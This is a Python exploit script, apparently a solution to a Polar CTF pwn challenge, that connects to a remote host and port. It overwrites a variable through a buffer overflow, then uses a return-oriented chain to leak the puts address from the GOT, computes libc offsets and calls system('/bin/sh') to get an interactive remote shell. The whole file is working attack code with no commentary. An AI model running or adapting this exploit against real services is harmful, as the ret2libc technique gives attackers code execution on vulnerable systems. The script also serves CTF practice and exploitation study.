from pwn64 import *


io = remote('1.95.36.136',2146)
# io=process("./pwn")
elf = ELF('./polar_pwn')
# libc= ELF(elf.libc.path)

io.sendline(b'1')
io.recv()

io.sendline(b'1')
io.recv()

io.sendline(b'1')
io.recv()


n_addr = 0x60108c
payload = b'a'*(0x50) + p64(n_addr+0x4)
io.sendline(payload)
io.recv()

io.sendline(b'520')
io.recv()

ret_add =0x00000000004005d9
pop_rdi =0x0000000000400a63
xxx_add =0x00000000004009CE
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x50

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_add)
io.sendlineafter(b'Welcome to Polar CTF!', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))



libc_base = puts_addr - 0x06f6a0
system_add = libc_base + 0x0453a0
bin_sh_add = libc_base + 0x18ce57

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'Welcome to Polar CTF!', payload2)

io.interactive()